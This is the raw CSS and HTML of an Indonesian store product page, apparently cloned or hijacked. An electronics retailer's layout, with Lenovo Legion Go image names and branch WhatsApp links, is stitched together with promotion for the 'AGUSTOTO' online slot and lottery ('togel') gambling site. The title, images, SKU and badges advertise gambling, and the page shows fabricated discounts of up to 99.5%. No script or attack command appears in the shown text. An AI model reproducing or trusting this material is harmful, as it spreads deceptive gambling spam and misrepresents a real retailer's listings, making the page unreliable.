.pd-share-preview{display:flex;gap:12px;padding:16px;background:#f8fafc;border-radius:12px;margin-bottom:24px}.pd-share-preview-img{width:64px;height:64px;border-radius:8px;object-fit:cover;flex-shrink:0;border:1px solid #e2e8f0}.pd-share-preview-info{flex:1;min-width:0}.pd-share-preview-name{font-size:14px;font-weight:600;color:#0f172a;margin:0 0 4px 0;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}.pd-share-preview-price{font-size:16px;font-weight:700;color:#0ea5e9;margin:0}

.pd-share-label{font-size:13px;font-weight:600;color:#475569;margin:0 0 12px 0;text-transform:uppercase;letter-spacing:.5px}.pd-share-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}.pd-share-option{display:flex;flex-direction:column;align-items:center;gap:8px;padding:16px 8px;border:1.5px solid #e2e8f0;border-radius:12px;background:#fff;cursor:pointer;transition:all .2s ease;text-decoration:none;color:inherit}.pd-share-option:hover{border-color:#94a3b8;background:#f8fafc;transform:translateY(-2px)}.pd-share-option:active{transform:translateY(0)}

.pd-share-icon{width:40px;height:40px;border-radius:10px;display:inline-flex;align-items:center;justify-content:center;position:relative}.pd-share-icon svg{width:24px;height:24px;display:block}.pd-share-icon-whatsapp{background:linear-gradient(135deg,#25D366 0%,#128C7E 100%);color:#fff}.pd-share-icon-facebook{background:linear-gradient(135deg,#1877F2 0%,#0c63d4 100%);color:#fff}.pd-share-icon-twitter{background:linear-gradient(135deg,#1DA1F2 0%,#0d8bd9 100%);color:#fff}.pd-share-icon-telegram{background:linear-gradient(135deg,#0088cc 0%,#0077b3 100%);color:#fff}.pd-share-icon-email{background:linear-gradient(135deg,#EA4335 0%,#c5331f 100%);color:#fff}.pd-share-icon-copy{background:linear-gradient(135deg,#f1db63 0%,#e5d146 100%);color:#fff}.pd-share-icon-pdf{background:linear-gradient(135deg,#8adeff 0%,#8adeff 100%);color:#fff}.pd-share-name{font-size:12px;font-weight:600;color:#475569;text-align:center}

.pd-share-copy-section{background:#f8fafc;padding:16px;border-radius:12px}.pd-share-copy-input-wrap{display:flex;gap:8px}.pd-share-copy-input{flex:1;padding:12px 14px;border:1px solid #e2e8f0;border-radius:10px;font-size:14px;color:#0f172a;background:#fff;font-family:'Segoe UI',system-ui,sans-serif}.pd-share-copy-input:focus{outline:0;border-color:#0ea5e9;box-shadow:0 0 0 3px rgba(14,165,233,.1)}.pd-share-copy-btn{padding:12px 20px;border:0;border-radius:10px;background:linear-gradient(135deg,#0ea5e9 0%,#0284c7 100%);color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s ease;white-space:nowrap;display:inline-flex;align-items:center;gap:6px}.pd-share-copy-btn:hover{background:linear-gradient(135deg,#0284c7 0%,#0369a1 100%);transform:translateY(-1px);box-shadow:0 4px 12px rgba(14,165,233,.3)}.pd-share-copy-btn:active{transform:translateY(0)}.pd-share-copy-btn svg{width:16px;height:16px}.pd-share-copy-btn.copied{background:linear-gradient(135deg,#22c55e 0%,#16a34a 100%);pointer-events:none}

@media(max-width:640px){.pd-share-modal{border-radius:20px 20px 0 0;margin-top:auto;max-height:85vh}.pd-share-grid{grid-template-columns:repeat(3,1fr)}.pd-share-header{padding:16px 20px}.pd-share-body{padding:20px}.pd-share-btn{width:36px;height:36px}.pd-share-btn svg{width:18px;height:18px}}@media(max-width:480px){.pd-share-grid{grid-template-columns:repeat(3,1fr);gap:10px}.pd-share-option{padding:12px 6px}.pd-share-icon{width:36px;height:36px}.pd-share-icon svg{width:20px;height:20px}.pd-share-name{font-size:11px}}

.mf-share{background:#fff;color:#8adeff;border:2px solid #8adeff;display:inline-flex;align-items:center;justify-content:center}.mf-share:active{transform:scale(.95)}.mf-share svg{display:block}

@media(max-width:640px){.pd-share-btn{display:none!important}}

.stock-badge.in{background:#e6f9ec;color:#15803d;border-radius:999px;padding:4px 10px;font-weight:700}.stock-badge.out{background:#8adeff;color:#14b1d7;border-radius:999px;padding:4px 10px;font-weight:700}

.stock-info-btn{--c:#0ea5e9;--b:#bae6fd;--bg:#f0f9ff;--bg-h:#e0f2fe;--b-h:#0ea5e9;margin-left:0;display:inline-flex;align-items:center;justify-content:center;gap:0.5rem;padding:4px 10px;border-radius:999px;border:1.5px solid var(--b);background:var(--bg);color:var(--c);cursor:pointer;font-size:12px;font-weight:600;transition:all .2s ease;-webkit-tap-highlight-color:transparent}.stock-info-btn:hover{background:var(--bg-h);border-color:var(--b-h);color:#0284c7;transform:translateY(-1px);box-shadow:0 2px 8px rgba(14,165,233,.15)}.stock-info-btn:active{transform:translateY(0)}.stock-info-btn:focus-visible{outline:0;box-shadow:0 0 0 3px rgba(14,165,233,.2)}.stock-info-btn svg{width:14px;height:14px;flex-shrink:0}.stock-info-btn .btn-text{white-space:nowrap}

.stock-popover{position:absolute;z-index:9999;min-width:280px;max-width:92vw;background:#0b1220;color:#eef3ff;border:1px solid rgba(255,255,255,.08);border-radius:14px;box-shadow:0 20px 40px rgba(12,12,20,.45);padding:12px 12px 8px;display:none}.stock-popover.show{display:block}.stock-popover::before{content:"";position:absolute;top:-8px;left:24px;width:14px;height:14px;background:#0b1220;border-left:1px solid rgba(255,255,255,.08);border-top:1px solid rgba(255,255,255,.08);transform:rotate(45deg)}.sp-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}.sp-title{font-weight:800;font-size:14px}.sp-close{background:transparent;border:0;color:#98a2b3;cursor:pointer}

.sp-list{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:8px}.sp-item{display:grid;grid-template-columns:1fr auto 32px;column-gap:12px;align-items:center;padding:10px 10px;min-height:44px;border-radius:10px;background:rgba(255,255,255,.03)}.sp-left{display:flex;align-items:center;gap:10px}.sp-dot{width:10px;height:10px;border-radius:999px;background:var(--dot,#60a5fa);display:inline-block}.sp-label{font-weight:600;font-size:13px}


.sp-qty{grid-column:2;justify-self:end;min-width:40px;text-align:right;font-weight:800;font-size:13px;color:#cfe4ff;font-variant-numeric:tabular-nums}

.sp-wa{
  grid-column:3; justify-self:end;
  width:32px; height:32px; min-width:32px; min-height:32px;
  box-sizing:border-box;
  padding:0; line-height:0; text-decoration:none; outline:0;
  display:inline-flex; align-items:center; justify-content:center;
  border-radius:999px; border:1px solid rgba(37,211,102,.60);  /* 1px untuk hasil â€œcrispâ€ */
  background:rgba(37,211,102,.08); color:#25D366;
  transition:background-color .15s ease, border-color .15s ease, transform .05s ease;
  -webkit-tap-highlight-color:transparent;
}
.sp-wa:hover{background:rgba(37,211,102,.16);border-color:rgba(37,211,102,.75)}
.sp-wa:active{transform:translateY(.5px) scale(.98)}

.sp-wa svg{width:18px;height:18px;display:block;vertical-align:middle}
.stock-popover a{text-decoration:none}

#deskripsi img{max-width:450px!important;height:unset!important}@media(max-width:640px){.stock-popover{position:fixed;left:0;right:0;bottom:max(12px,env(safe-area-inset-bottom,12px));margin:0 10px;padding:14px 12px 10px;border-radius:16px}.stock-popover::before{display:none}.stock-info-btn{padding:4px 8px;gap:4px;border:0;background:transparent}.stock-info-btn:hover{background:transparent;box-shadow:none;transform:none}.stock-info-btn .btn-text{display:none}.stock-info-btn svg{width:16px;height:16px}.sp-item{grid-template-columns:1fr auto 36px}.sp-wa{width:36px;height:36px;min-width:36px;min-height:36px}.sp-wa svg{width:19px;height:19px}}

.stock-dot{position:absolute;bottom:8px;right:8px;width:8px;height:8px;border-radius:50%;box-shadow:0 1px 3px rgba(0,0,0,0.4);z-index:2;cursor:help}.stock-dot.ready{background:#10b981}.stock-dot.low{background:#f59e0b}.stock-dot.out{background:#8adeff}.stock-dot:hover{transform:scale(1.2);transition:transform 0.2s ease}@media(max-width:640px){.stock-dot{width:7px;height:7px;bottom:6px;right:6px}}

.pd-related-card .spec-chips{font-size:11px;color:#64748b;margin:4px 0 6px 0;line-height:1.3;font-weight:500}.pd-related-card .spec-chips .spec-divider{margin:0 4px;opacity:0.6}@media(max-width:640px){.pd-related-card .spec-chips{font-size:10px;margin:3px 0 5px 0}#deskripsi img{max-width:300px!important;height:unset!important;justify-self:center!important}}

.pwp-trigger-badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px 4px;background:linear-gradient(135deg,#fbbf24 0%,#f59e0b 100%);color:#78350f;border-radius:6px;font-size:.65rem;font-weight:600;border:0}.pwp-trigger-badge svg{flex-shrink:0;width:12px;height:12px}
.pwp-deals-section{margin:0;padding:12px;background:linear-gradient(135deg,#fef3c7 0%,#fde68a 100%);border-radius:12px;border:2px solid #fbbf24}.pwp-deals-header{display:flex;gap:10px;margin-bottom:10px}.pwp-icon{flex-shrink:0;color:#f59e0b;width:18px;height:18px}.pwp-text .pwp-title{margin:0 0 2px 0;font-size:14px;font-weight:700;color:#78350f}.pwp-text .pwp-subtitle{margin:0;font-size:11px;color:#92400e;opacity:0.9}.pwp-deals-loading{text-align:center;padding:40px 0;color:#92400e}.pwp-spinner{width:40px;height:40px;border:3px solid #fbbf24;border-top-color:#f59e0b;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 12px}@keyframes spin{to{transform:rotate(360deg)}}
.pwp-deals-grid{display:flex;flex-direction:column;gap:6px}.pwp-deal-card{background:#fff;border-radius:6px;overflow:hidden;border:1px solid #fbbf24;display:flex;align-items:center;padding:8px;gap:10px}.pwp-deal-card:hover{background:#fef3c7}.pwp-deal-thumb{flex-shrink:0;width:50px;height:50px;background:#f8fafc;overflow:hidden;border-radius:4px}.pwp-deal-thumb img{width:100%;height:100%;object-fit:cover}.pwp-deal-badge{background:#8adeff;color:#fff;padding:2px 5px;border-radius:3px;font-size:9px;font-weight:700;margin-left:auto}.pwp-deal-info{flex:1;display:flex;flex-direction:column;gap:4px}.pwp-deal-name{font-size:12px;font-weight:600;color:#0f172a;margin:0;line-height:1.2}.pwp-deal-prices{display:flex;align-items:center;gap:6px;flex-wrap:wrap}.pwp-deal-price{font-size:14px;font-weight:800;color:#8adeff;white-space:nowrap}.pwp-deal-original{font-size:11px;color:#64748b;text-decoration:line-through;white-space:nowrap}.pwp-cart-note{margin-top:8px;padding:6px 10px;background:#e0f2fe;border-left:2px solid#0ea5e9;font-size:11px;color:#0c4a6e;border-radius:4px}
@media(max-width:640px){.pwp-deals-section{margin:12px 0;padding:10px;border-radius:10px}.pwp-deals-header{gap:8px}.pwp-text .pwp-title{font-size:13px}.pwp-text .pwp-subtitle{font-size:10px}.pwp-deal-card{padding:6px;gap:8px}.pwp-deal-thumb{width:45px;height:45px}.pwp-deal-name{font-size:11px}.pwp-deal-price{font-size:13px}.pwp-deal-original{font-size:10px}}

.preorder-badge{display:inline-flex;align-items:center;gap:5px;padding:6px 12px;background:linear-gradient(135deg,#8b5cf6 0%,#7c3aed 100%);color:#fff;border-radius:8px;font-size:13px;font-weight:700;border:0;box-shadow:0 2px 8px rgba(139,92,246,.25)}.preorder-badge svg{width:16px;height:16px;flex-shrink:0}.preorder-info{margin:12px 0;padding:14px;background:linear-gradient(135deg,#f5f3ff 0%,#ede9fe 100%);border:1.5px solid #c4b5fd;border-radius:12px}.preorder-info-header{display:flex;align-items:center;gap:8px;margin-bottom:10px}.preorder-info-icon{width:20px;height:20px;color:#7c3aed;flex-shrink:0}.preorder-info-title{font-size:14px;font-weight:700;color:#5b21b6;margin:0}.preorder-info-items{display:flex;flex-direction:column;gap:8px}.preorder-info-row{display:flex;align-items:center;justify-content:space-between;font-size:13px}.preorder-info-label{color:#6b21a8;font-weight:600}.preorder-info-value{color:#5b21b6;font-weight:700}.preorder-info-value.highlight{color:#8adeff;font-size:14px}.preorder-info-note{margin-top:10px;padding:8px 10px;background:#fef3c7;border-left:2px solid #f59e0b;font-size:12px;color:#78350f;border-radius:6px;line-height:1.4}@media(max-width:640px){.preorder-badge{font-size:12px;padding:5px 10px}.preorder-info{margin:10px 0;padding:12px}.preorder-info-title{font-size:13px}.preorder-info-row{font-size:12px}.preorder-info-note{font-size:11px;padding:6px 8px}}
</style>

<div class="pd-sticky-header" id="pd-sticky-header"><div class="pd-sticky-header-container"><div class="pd-sticky-thumb"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="AGUSTOTO" id="pd-sticky-thumb-img"></div><div class="pd-sticky-info"><h2 class="pd-sticky-title" id="pd-sticky-title">AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat</h2><div class="pd-sticky-price-row"><span class="pd-sticky-price" id="pd-sticky-price">Rp 5.000,-</span><span class="pd-sticky-price-original" id="pd-sticky-price-original">Rp 1.000.000</span><span class="pd-sticky-discount" id="pd-sticky-discount">-99.5%</span></div></div><div class="pd-sticky-actions"><button type="button" class="pd-sticky-share-btn" id="pd-sticky-share-btn" aria-label="Bagikan produk" title="Bagikan"><svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="currentColor" d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg></button><button type="button" class="pd-sticky-btn pd-sticky-btn-chat" id="pd-sticky-chat"><svg viewBox="0 0 640 640" fill="currentColor" aria-hidden="true"><path d="M320 128C241 128 175.3 185.3 162.3 260.7C171.6 257.7 181.6 256 192 256L208 256C234.5 256 256 277.5 256 304L256 400C256 426.5 234.5 448 208 448L192 448C139 448 96 405 96 352L96 288C96 164.3 196.3 64 320 64C443.7 64 544 164.3 544 288L544 456.1C544 522.4 490.2 576.1 423.9 576.1L336 576L304 576C277.5 576 256 554.5 256 528C256 501.5 277.5 480 304 480L336 480C362.5 480 384 501.5 384 528L384 528L424 528C463.8 528 496 495.8 496 456L496 435.1C481.9 443.3 465.5 447.9 448 447.9L432 447.9C405.5 447.9 384 426.4 384 399.9L384 303.9C384 277.4 405.5 255.9 432 255.9L448 255.9C458.4 255.9 468.3 257.5 477.7 260.6C464.7 185.3 399.1 127.9 320 127.9z"/></svg>Tanya</button><button type="button" class="pd-sticky-btn pd-sticky-btn-cart" id="pd-sticky-add-cart" disabled>+ Keranjang</button><button type="button" class="pd-sticky-btn pd-sticky-btn-buy" id="pd-sticky-buy" disabled>Beli Sekarang</button></div></div></div>

<main class="product-single product-single--v3"><nav class="pd-breadcrumb" aria-label="breadcrumb"><span class="current">career.php</span></nav>

<div class="pd-top-layout"><section class="pd-media-card"><figure class="pd-main-image" id="pd-main-figure"><img id="pd-main-img" src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="AGUSTOTO" data-slug="" loading="eager">
</figure>

<div class="pd-mobile-slider-wrapper">
<div class="pd-mobile-slider" id="pd-mobile-slider" aria-label="Galeri gambar (geser)"><div class="pd-mslide"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="eager"></div><div class="pd-mslide"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></div><div class="pd-mslide"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></div><div class="pd-mslide"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></div><div class="pd-mslide"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></div><div class="pd-mslide"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></div></div><div class="pd-gallery-counter" id="pd-gallery-counter">1/6</div></div>
<div class="pd-thumb-gallery" id="pd-thumb-gallery" aria-label="Galeri gambar produk"><button type="button" class="pd-thumb-btn active" data-full="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" data-alt="TOGEL ONLINE" data-slug="" aria-label="Gambar 1"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></button><button type="button" class="pd-thumb-btn " data-full="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" data-alt="TOGEL ONLINE" data-slug="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" aria-label="Gambar 2"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></button><button type="button" class="pd-thumb-btn " data-full="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" data-alt="TOGEL ONLINE" data-slug="lenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-b-1761796941-223.webp" aria-label="Gambar 3"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></button><button type="button" class="pd-thumb-btn " data-full="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" data-alt="TOGEL ONLINE" data-slug="lenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-b-1761796941-776.webp" aria-label="Gambar 4"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></button><button type="button" class="pd-thumb-btn " data-full="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" data-alt="TOGEL ONLINE" data-slug="lenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-b-1761796941-634.webp" aria-label="Gambar 5"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></button><button type="button" class="pd-thumb-btn " data-full="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" data-alt="TOGEL ONLINE" data-slug="lenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-b-1761796941-892.webp" aria-label="Gambar 6"><img src="https://chemtrols-com.agustoto.xyz/asset/agustoto-slot-wd-trik-pintar-situs-slot-gacor-slot-olympus-surabaya-dengan-info-.webp" alt="TOGEL ONLINE" loading="lazy"></button></div></section><section class="pd-info-card"><div id="pd-variant-combined" class="pd-variant-combined" hidden></div><div class="pd-title-row">
        <h1 class="pd-title" id="pd-title">AGUSTOTO Slot WD Trik Pintar Situs Slot Gacor Slot Olympus Surabaya dengan Info Akurat</h1><button type="button" class="pd-share-btn" id="pd-share-btn" aria-label="Bagikan produk" title="Bagikan"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path fill="currentColor" d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg></button></div>
<div id="pd-price-anchor">
</div>
<div class="pd-price-qr-container">
        <div class="pd-price-block" id="pd-price-block">
                <div class="pd-price-row">
                        <span class="pd-price-current" id="pd-price-current" >Rp 5.000</span>
                        <span class="pd-price-original" id="pd-price-original">Rp 50.000</span>
                        <span class="pd-discount-badge" id="pd-discount-badge">-90%</span></div>
                        <div class="pd-meta-row">
                                <span class="sold-inline" id="pd-sold-inline" data-role="sold-chip">Terjual Terjual 5</span>
                                <span class="pwp-trigger-badge" id="pwp-trigger-badge" hidden>
                                        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M21.41 11.58l-9-9C12.05 2.22 11.55 2 11 2H4c-1.1 0-2 .9-2 2v7c0 .55.22 1.05.59 1.42l9 9c.36.36.86.58 1.41.58.55 0 1.05-.22 1.41-.59l7-7c.37-.36.59-.86.59-1.41 0-.55-.23-1.06-.59-1.42zM5.5 7C4.67 7 4 6.33 4 5.5S4.67 4 5.5 4 7 4.67 7 5.5 6.33 7 5.5 7z"/></svg>Bisa PWP</span></div>
                                                <div class="pd-meta-inline"><span class="stock-badge out" id="pd-stock-badge">AGUSTOTO</span>
                                                        <span class="sku">SKU: <span id="pd-sku">BANDAR TOGEL</span></span></div>
<div class="paylater-promo paylater-promo-sm paylater-mobile-only">
    <span class="paylater-icon">ðŸ’³</span>
    <span class="paylater-text">
        <strong>TOGEL</strong>
        <small>ONLINE</small>
    </span>
</div>

<div class="stock-popover" id="pd-stock-popover" role="dialog" aria-hidden="true" aria-label="Informasi stok cabang"><div class="sp-head"><div class="sp-title">Stok Cabang</div><button type="button" class="sp-close" id="pd-stock-popover-close" aria-label="Tutup"><svg width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M18.3 5.71L12 12.01l-6.3-6.3-1.4 1.41 6.3 6.3-6.3 6.3 1.4 1.41 6.3-6.3 6.3 6.3 1.41-1.41-6.3-6.3 6.3-6.3z"/></svg></button></div><ul class="sp-list">
<li class="sp-item"><div class="sp-left"><span class="sp-dot" style="--dot:#60a5fa;"></span><span class="sp-label">Asia Mega Mas</span></div><span class="sp-qty" id="sp-qty-meg">0</span><a class="sp-wa" href="https://wa.me/6281380009898?text=Halo%2C%20saya%20ingin%20tanya%20stok%20di%20Asia%20Mega%20Mas%20untuk%20produk%20https%3A%2F%2Fplazait.co.id%2Fproduct%2Flenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-black" target="_blank" rel="noopener" aria-label="WhatsApp Asia Mega Mas"><svg class="ico-wa" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.029-.967-.273-.099-.471-.148-.669.149-.198.297-.767.966-.94 1.164-.173.198-.347.223-.644.074-.297-.149-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.52.149-.173.198-.297.298-.495.099-.198.05-.372-.025-.521-.075-.149-.669-1.612-.916-2.206-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.262.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.718 2.006-1.411.248-.694.248-1.29.173-1.411-.074-.123-.272-.198-.57-.347m-5.421 7.403h-.002a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.263c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.887 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.158 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.305-1.654a11.86 11.86 0 005.67 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.485-8.413"/></svg></a></li>
                
                    <li class="sp-item">
                      <div class="sp-left">
                        <span class="sp-dot" style="--dot:#34d399;"></span>
                        <span class="sp-label">Medan Fair</span>
                      </div>
                      <span class="sp-qty" id="sp-qty-mdf">0</span>
                      <a class="sp-wa"
                         href="https://wa.me/6285388992009?text=Halo%2C%20saya%20ingin%20tanya%20stok%20di%20Medan%20Fair%20untuk%20produk%20https%3A%2F%2Fplazait.co.id%2Fproduct%2Flenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-black"
                         target="_blank" rel="noopener" aria-label="WhatsApp Medan Fair">
                        <svg class="ico-wa" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                            <path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.029-.967-.273-.099-.471-.148-.669.149-.198.297-.767.966-.94 1.164-.173.198-.347.223-.644.074-.297-.149-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.52.149-.173.198-.297.298-.495.099-.198.05-.372-.025-.521-.075-.149-.669-1.612-.916-2.206-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.262.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.718 2.006-1.411.248-.694.248-1.29.173-1.411-.074-.123-.272-.198-.57-.347m-5.421 7.403h-.002a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.263c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.887 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.158 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.305-1.654a11.86 11.86 0 005.67 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.485-8.413"/>
                          </svg>
                      </a>
                    </li>
                
                    <li class="sp-item">
                      <div class="sp-left">
                        <span class="sp-dot" style="--dot:#f59e0b;"></span>
                        <span class="sp-label">Banda Aceh</span>
                      </div>
                      <span class="sp-qty" id="sp-qty-bda">0</span>
                      <a class="sp-wa"
                         href="https://wa.me/628116833411?text=Halo%2C%20saya%20ingin%20tanya%20stok%20di%20Banda%20Aceh%20untuk%20produk%20https%3A%2F%2Fplazait.co.id%2Fproduct%2Flenovo-legion-go-8asp2-83n0000rid-ryzen-z2-extreme-amd-radeon-graphics-eclipse-black"
                         target="_blank" rel="noopener" aria-label="WhatsApp Banda Aceh">
                        <svg class="ico-wa" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                            <path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.029-.967-.273-.099-.471-.148-.669.149-.198.297-.767.966-.94 1.164-.173.198-.347.223-.644.074-.297-.149-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.52.149-.173.198-.297.298-.495.099-.198.05-.372-.025-.521-.075-.149-.669-1.612-.916-2.206-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.262.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.718 2.006-1.411.248-.694.248-1.29.173-1.411-.074-.123-.272-.198-.57-.347m-5.421 7.403h-.002a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.263c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.887 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.158 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.305-1.654a11.86 11.86 0 005.67 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.485-8.413"/>
                          </svg>
                      </a>
                    </li>
                  </ul>
                </div>

                            </div>
